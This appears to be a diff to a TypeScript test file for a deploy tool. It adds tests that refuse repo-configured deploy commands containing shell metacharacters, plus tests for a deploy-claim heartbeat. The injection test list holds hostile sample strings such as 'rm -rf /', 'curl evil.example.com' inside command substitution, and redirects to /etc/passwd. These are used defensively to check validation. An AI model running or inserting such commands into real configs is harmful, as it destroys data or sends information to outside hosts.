@@ -2,7 +2,9 @@ import { describe, expect, test } from "bun:test";
 import { existsSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import path from "node:path";
+import type { DeployClaim } from "./deploy-claim";
 import {
+  defaultProdDeployCmd,
   defaultStageDeployCmd,
   ensureChongIgnored,
   liveTipCoversSha,
@@ -10,6 +12,7 @@ import {
   prodDeployedShaBucket,
   selectLiveDeployTip,
   stageDeployedShaBucket,
+  startClaimHeartbeat,
 } from "./stage-deploy";
 
 function repo(): string {
@@ -180,6 +183,82 @@ describe("defaultStageDeployCmd", () => {
   });
 });
 
+describe("configured deploy command validation — shell metacharacter injection", () => {
+  // .chong/config.json is deliberately committed to the watched repo, so its
+  // stageDeployCmd/prodDeployCmd is repo-supplied text run via `bash -c` with the
+  // operator's full environment (AWS credentials included). A clean configured command
+  // must still work; one containing a forbidden shell metacharacter must be refused
+  // entirely (falls back to "no deploy command configured"), not run neutered.
+
+  test("a clean configured stageDeployCmd still works", () => {
+    const dir = repo();
+    withChong(dir, { stageDeployCmd: "make ship-stage --env=ci" });
+    expect(defaultStageDeployCmd(dir)).toBe("make ship-stage --env=ci");
+  });
+
+  test("a clean configured prodDeployCmd still works", () => {
+    const dir = repo();
+    withChong(dir, { prodDeployCmd: "make ship-prod --env=production" });
+    expect(defaultProdDeployCmd(dir)).toBe("make ship-prod --env=production");
+  });
+
+  test("the built-in deploy-frontend.sh default still passes validation unchanged", () => {
+    const dir = repo();
+    asFrontend(dir);
+    expect(defaultStageDeployCmd(dir)).toBe(
+      "CI=true FORCE=1 DEPLOY_SKIP_INSTALL=1 ./scripts/deploy-frontend.sh ci",
+    );
+    expect(defaultProdDeployCmd(dir)).toBe(
+      "CI=true FORCE=1 DEPLOY_SKIP_INSTALL=1 ./scripts/deploy-frontend.sh prod",
+    );
+  });
+
+  const metacharacterCases: Array<[string, string]> = [
+    ["semicolon", "make ship; rm -rf /"],
+    ["pipe", "make ship | tee /tmp/x"],
+    ["background/AND", "make ship && curl evil.example.com"],
+    ["ampersand alone", "make ship & disown"],
+    ["dollar substitution", "make ship $(curl evil.example.com)"],
+    ["backtick substitution", "make ship `curl evil.example.com`"],
+    ["subshell paren", "(make ship)"],
+    ["closing paren", "make ship) ; rm -rf /"],
+    ["redirect out", "make ship > /etc/passwd"],
+    ["redirect in", "make ship < /etc/passwd"],
+    ["embedded newline", "make ship\ncurl evil.example.com"],
+    ["embedded carriage return", "make ship\rcurl evil.example.com"],
+  ];
+
+  for (const [label, malicious] of metacharacterCases) {
+    test(`refuses a configured stageDeployCmd containing a ${label}`, () => {
+      const dir = repo();
+      withChong(dir, { stageDeployCmd: malicious });
+      expect(defaultStageDeployCmd(dir)).toBeNull();
+    });
+
+    test(`refuses a configured prodDeployCmd containing a ${label}`, () => {
+      const dir = repo();
+      withChong(dir, { prodDeployCmd: malicious });
+      expect(defaultProdDeployCmd(dir)).toBeNull();
+    });
+  }
+
+  test("an unsafe configured stageDeployCmd does not fall through to the built-in default", () => {
+    // The refusal must land the repo in "cannot local-deploy", not silently swap in a
+    // different (safe) command the operator did not ask for.
+    const dir = repo();
+    asFrontend(dir);
+    withChong(dir, { stageDeployCmd: "make ship; rm -rf /" });
+    expect(defaultStageDeployCmd(dir)).toBeNull();
+  });
+
+  test("an unsafe configured prodDeployCmd does not fall through to the built-in default", () => {
+    const dir = repo();
+    asFrontend(dir);
+    withChong(dir, { prodDeployCmd: "make ship; rm -rf /" });
+    expect(defaultProdDeployCmd(dir)).toBeNull();
+  });
+});
+
 describe("ensureChongIgnored", () => {
   test("creates .chong and ignores it", () => {
     const dir = repo();
@@ -243,5 +322,83 @@ describe("ensureChongIgnored", () => {
     writeFileSync(path.join(dir, ".gitignore"), "dist");
     ensureChongIgnored(dir);
     expect(readFileSync(path.join(dir, ".gitignore"), "utf8")).not.toContain("dist#");
+  });
+});
+
+describe("startClaimHeartbeat — serializes overlapping ticks", () => {
+  const claim: DeployClaim = { v: 1, id: "claim-1", user: "si", sha: "abc1234", at: "now" };
+
+  function wait(ms: number): Promise<void> {
+    return new Promise((resolve) => setTimeout(resolve, ms));
+  }
+
+  test("never runs a second heartbeat while one is still in flight", async () => {
+    let concurrent = 0;
+    let maxConcurrent = 0;
+    let calls = 0;
+    const heartbeat = async () => {
+      calls += 1;
+      concurrent += 1;
+      maxConcurrent = Math.max(maxConcurrent, concurrent);
+      // Slower than the interval below, so without the in-flight guard the next tick
+      // would fire while this one is still running.
+      await wait(30);
+      concurrent -= 1;
+      return true;
+    };
+
+    const stop = startClaimHeartbeat(
+      "bucket",
+      claim,
+      () => {
+        throw new Error("should not be lost");
+      },
+      { heartbeat, intervalMs: 5 },
+    );
+
+    await wait(120);
+    stop();
+    // Let any in-flight tick from just before `stop()` finish before asserting.
+    await wait(40);
+
+    expect(maxConcurrent).toBe(1);
+    expect(calls).toBeGreaterThan(1);
+  });
+
+  test("calls onLost exactly once when the claim is stolen, and stops heartbeating", async () => {
+    let calls = 0;
+    let lostCalls = 0;
+    const heartbeat = async () => {
+      calls += 1;
+      return false;
+    };
+
+    const stop = startClaimHeartbeat(
+      "bucket",
+      claim,
+      () => {
+        lostCalls += 1;
+      },
+      { heartbeat, intervalMs: 5 },
+    );
+
+    await wait(60);
+    const callsAtLoss = calls;
+    await wait(60);
+    stop();
+
+    expect(lostCalls).toBe(1);
+    // No further heartbeat calls once `lost` is set, even though the timer kept firing.
+    expect(calls).toBe(callsAtLoss);
+  });
+
+  test("does nothing when there is no bucket or no claim (nothing to heartbeat)", () => {
+    let called = false;
+    const stop = startClaimHeartbeat(null, claim, () => {
+      called = true;
+    });
+    expect(typeof stop).toBe("function");
+    stop();
+    expect(called).toBe(false);
   });
 });
